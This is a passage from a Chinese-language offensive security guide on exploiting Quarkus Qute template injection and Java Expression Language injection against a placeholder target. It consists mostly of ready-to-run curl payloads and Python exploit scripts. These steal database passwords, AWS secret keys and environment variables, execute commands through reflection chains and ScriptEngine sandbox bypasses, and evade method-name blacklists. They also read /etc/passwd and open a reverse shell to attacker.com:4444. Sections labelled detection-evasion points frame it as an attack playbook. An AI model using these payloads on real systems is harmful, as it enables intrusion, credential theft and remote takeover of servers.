curl -i "http://target.com/api/render?template={config:property('quarkus.datasource.username')}"
curl -i "http://target.com/api/render?template={config:property('quarkus.datasource.password')}"
# 可能泄露数据库凭证

# 读取环境变量
curl -i "http://target.com/api/render?template={inject:java.lang.System.getenv('AWS_SECRET_ACCESS_KEY')}"
# 泄露云凭证

# 读取系统属性
curl -i "http://target.com/api/render?template={inject:java.lang.System.getProperty('user.dir')}"
```

**步骤 4：Qute 模板注入至 RCE 完整链**

```python
# qute_injection.py - Quarkus Qute 模板注入利用
import requests
import urllib.parse

TARGET = "http://target.com/api/render"

def qute_eval(template):
    """执行 Qute 模板"""
    r = requests.get(TARGET, params={"template": template})
    return r.text

def qute_rce(command):
    """通过 Qute 注入执行命令"""
    # 方法 1: inject + Runtime
    template = f"{{inject:java.lang.Runtime.getRuntime().exec('{command}')}}"
    result = qute_eval(template)
    
    # 方法 2: 反射（若方法 1 失败）
    template2 = f"{{''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'{command}')}}"
    result2 = qute_eval(template2)
    
    return result, result2

# 探测
print("[*] 7*7:", qute_eval("{7*7}"))
print("[*] config:", qute_eval("{config:property('quarkus.application.name')}"))

# 读取敏感配置
print("[*] DB user:", qute_eval("{config:property('quarkus.datasource.username')}"))
print("[*] DB pass:", qute_eval("{config:property('quarkus.datasource.password')}"))
print("[*] AWS key:", qute_eval("{inject:java.lang.System.getenv('AWS_ACCESS_KEY_ID')}"))

# RCE
qute_rce("id")
qute_rce("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'")
```

**步骤 5：利用 Qute 的循环和条件语句**

```bash
# Qute 支持循环和条件
# 遍历系统属性
curl -i "http://target.com/api/render?template={#for entry in inject:java.lang.System.getProperties().entrySet()}{entry.key}={entry.value}{/}"

# 遍历环境变量
curl -i "http://target.com/api/render?template={#for entry in inject:java.lang.System.getenv().entrySet()}{entry.key}={entry.value}\n{/}"

# 条件判断
curl -i "http://target.com/api/render?template={#if inject:java.lang.System.getProperty('os.name').contains('Linux')}Linux{#else}Other{/}"
```

**步骤 6：绕过 Qute 沙箱限制**

```bash
# Quarkus 3.x+ 可能限制 Qute 可访问的类
# 绕过: 使用 CDI bean 间接访问

# 注入 ApplicationContext
curl -i "http://target.com/api/render?template={inject:io.quarkus.arc.ArcContainer}"

# 注入 ConfigProvider 读取所有配置
curl -i "http://target.com/api/render?template={inject:org.eclipse.microprofile.config.Config.getConfig().getPropertyNames()}"

# 通过 DataSource 获取数据库连接
curl -i "http://target.com/api/render?template={inject:javax.sql.DataSource.getConnection()}"
# 若成功 → 可执行 SQL 查询

# 使用 ScriptEngine 绕过
curl -i "http://target.com/api/render?template={inject:javax.script.ScriptEngineManager.newInstance().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec(\"id\")')}"
```

**检测规避要点**：
- Qute 使用 `{expr}` 而非 `${expr}`，探测 payload 不同
- `{inject:}` 命名空间是 Qute 特有，可注入任意 CDI bean
- `{config:}` 命名空间读取应用配置，常含敏感信息
- ScriptEngine (JS) 是 Qute 沙箱绕过的通用方法

---

### 攻击链 5：EL 注入绕过（反射 API）

**场景**：目标应用使用 EL 沙箱限制直接类型访问（禁止 `T()`、`forName()` 等），需要通过反射 API 链式绕过。

**步骤 1：确认沙箱限制**

```bash
# 测试直接类型访问是否被禁止
curl -i "http://target.com/api/eval?expression=\${T(java.lang.Runtime)}"
# 若报错 "Type references are not allowed" → 沙箱启用

# 测试反射访问
curl -i "http://target.com/api/eval?expression=\${''.getClass()}"
# 若返回 class java.lang.String → getClass() 可用

# 测试 forName
curl -i "http://target.com/api/eval?expression=\${''.getClass().forName('java.lang.Runtime')}"
# 若返回 class java.lang.Runtime → 反射链可行
```

**步骤 2：构建反射链**

```bash
# 完整反射链: 
# String → getClass → forName(Runtime) → getMethod(exec) → invoke
curl -i "http://target.com/api/eval?expression=\${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}"

# 分步调试:
# 步骤 1: 获取 String 的 Class 对象
curl -i "http://target.com/api/eval?expression=\${''.getClass()}"
# 返回: class java.lang.String

# 步骤 2: 加载 Runtime 类
curl -i "http://target.com/api/eval?expression=\${''.getClass().forName('java.lang.Runtime')}"
# 返回: class java.lang.Runtime

# 步骤 3: 获取 getRuntime 方法
curl -i "http://target.com/api/eval?expression=\${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime')}"
# 返回: public static java.lang.Runtime java.lang.Runtime.getRuntime()

# 步骤 4: 调用 getRuntime 获取实例
curl -i "http://target.com/api/eval?expression=\${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null)}"
# 返回: java.lang.Runtime@xxxx

# 步骤 5: 获取 exec 方法
curl -i "http://target.com/api/eval?expression=\${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass())}"
# 返回: public java.lang.Process java.lang.Runtime.exec(java.lang.String)

# 步骤 6: 调用 exec 执行命令
# 组合以上所有步骤
```

**步骤 3：通过反射获取命令输出**

```bash
# exec() 返回 Process 对象，需要进一步读取 InputStream
# 完整链: exec → getInputStream → read

# 使用 Scanner 读取输出
curl -i "http://target.com/api/eval?expression=\${''.getClass().forName('java.util.Scanner').getDeclaredConstructors()[1].newInstance(''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id').getInputStream()).useDelimiter('\\\\A').next()}"

# 使用 BufferedReader 读取
curl -i "http://target.com/api/eval?expression=\${''.getClass().forName('java.io.BufferedReader').getDeclaredConstructors()[0].newInstance(''.getClass().forName('java.io.InputStreamReader').getDeclaredConstructors()[0].newInstance(''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id').getInputStream())).readLine()}"
```

**步骤 4：绕过方法名黑名单**

```bash
# 若沙箱黑名单拦截 "exec"、"getRuntime" 等方法名
# 绕过: 使用 getDeclaredMethods 遍历方法

# 获取所有方法名
curl -i "http://target.com/api/eval?expression=\${''.getClass().forName('java.lang.Runtime').getDeclaredMethods()}"

# 通过索引访问方法（避免使用方法名）
# 假设 exec 是第 N 个方法
curl -i "http://target.com/api/eval?expression=\${''.getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}"

# 或通过方法名拼接绕过黑名单
# exec → 'ex'+'ec'
curl -i "http://target.com/api/eval?expression=\${''.getClass().forName('java.lang.Runtime').getMethod('ex'.concat('ec'),''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('get'.concat('Runtime')).invoke(null),'id')}"
```

**步骤 5：使用 ScriptEngine 绕过**

```bash
# ScriptEngine 提供独立的执行环境，不受 EL 沙箱限制

# Nashorn (JavaScript) 引擎
curl -i "http://target.com/api/eval?expression=\${T(javax.script.ScriptEngineManager).newInstance().getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec(\\\"id\\\")')}"

# 若 T() 被禁止，用反射加载 ScriptEngineManager
curl -i "http://target.com/api/eval?expression=\${''.getClass().forName('javax.script.ScriptEngineManager').getDeclaredConstructors()[0].newInstance().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec(\\\"id\\\")')}"

# Groovy 引擎（若可用）
curl -i "http://target.com/api/eval?expression=\${''.getClass().forName('javax.script.ScriptEngineManager').getDeclaredConstructors()[0].newInstance().getEngineByName('groovy').eval('\"id\".execute().text')}"

# 执行多行 JavaScript
curl -i "http://target.com/api/eval?expression=\${''.getClass().forName('javax.script.ScriptEngineManager').getDeclaredConstructors()[0].newInstance().getEngineByName('js').eval(new String('var r = java.lang.Runtime.getRuntime(); var p = r.exec([\\\"bash\\\",\\\"-c\\\",\\\"id\\\"]); var is = p.getInputStream(); var br = new java.io.BufferedReader(new java.io.InputStreamReader(is)); var line; while((line=br.readLine())!=null) print(line);'))}"
```

**步骤 6：自动化反射链生成器**

```python
# el_reflection_bypass.py - EL 注入反射链自动生成
import requests
import urllib.parse

TARGET = "http://target.com/api/eval"

def el_eval(expression):
    """评估 EL 表达式"""
    r = requests.get(f"{TARGET}?expression={urllib.parse.quote(expression)}")
    return r.text

def generate_reflection_chain(command):
    """
    生成反射链 payload
    等价于: Runtime.getRuntime().exec(command)
    """
    chain = (
        "${"
        "''.getClass()"                                    # String.class
        ".forName('java.lang.Runtime')"                    # Runtime.class
        ".getMethod('exec',''.getClass())"                # exec(String) 方法
        ".invoke("
        "''.getClass().forName('java.lang.Runtime')"      # Runtime.class
        ".getMethod('getRuntime')"                        # getRuntime 方法
        ".invoke(null)"                                   # 获取 Runtime 实例
        f",'{command}'"                                   # 命令参数
        ")"
        "}"
    )
    return chain

def generate_scriptengine_chain(command):
    """生成 ScriptEngine 绕过 payload"""
    js_code = f"java.lang.Runtime.getRuntime().exec(['bash','-c','{command}'])"
    chain = (
        "${"
        "''.getClass().forName('javax.script.ScriptEngineManager')"
        ".getDeclaredConstructors()[0].newInstance()"
        ".getEngineByName('js')"
        f".eval(\"{js_code}\")"
        "}"
    )
    return chain

# 测试反射链
print("[*] 测试反射链 id:")
payload = generate_reflection_chain("id")
print(f"Payload: {payload}")
print(f"结果: {el_eval(payload)}")

# 测试 ScriptEngine 绕过
print("[*] 测试 ScriptEngine 绕过:")
payload = generate_scriptengine_chain("whoami")
print(f"Payload: {payload}")
print(f"结果: {el_eval(payload)}")

# 读取文件
print("[*] 读取 /etc/passwd:")
payload = generate_reflection_chain("cat /etc/passwd")
print(f"结果: {el_eval(payload)}")

# 反弹 shell
print("[*] 发送反弹 shell:")
payload = generate_scriptengine_chain("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'")
el_eval(payload)
```

**检测规避要点**：
- 反射链 `getClass().forName()` 绕过 `T()` 操作符限制
- 方法名拼接 `'ex'.concat('ec')` 绕过方法名黑名单
- `getDeclaredMethods()[N]` 通过索引访问方法，完全避免方法名
- ScriptEngine (Nashorn/Groovy) 提供独立的执行环境，是最强绕过
